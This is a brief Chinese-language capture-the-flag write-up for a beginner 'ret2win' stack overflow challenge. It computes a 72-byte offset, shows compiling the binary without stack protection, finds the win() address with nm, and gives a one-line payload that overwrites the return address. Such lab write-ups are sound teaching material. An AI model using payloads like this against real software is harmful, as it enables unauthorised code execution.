# Pwn 题解：ret2win 热身

## 解法

这是最基础的 `ret2win`。源码里 `name[64]` 明显被 `read(..., 160)` 溢出，因此偏移就是：

- `64` 字节缓冲区
- `8` 字节 saved rbp
- 下一跳就是返回地址

也就是 `72` 字节。

本地验证时先编译样本，再取 `win()` 地址并覆盖返回地址：

```bash
gcc -O0 -g -fno-stack-protector -no-pie -o challenge.bin docker/src/challenge.c
nm -an challenge.bin | awk '/ win$/ {print "0x"$1}'
```

随后构造 payload：

```python
payload = b"A" * 72 + p64(win_addr)
```

把它送给程序后，流程会直接跳到 `win()`，输出动态 Flag。
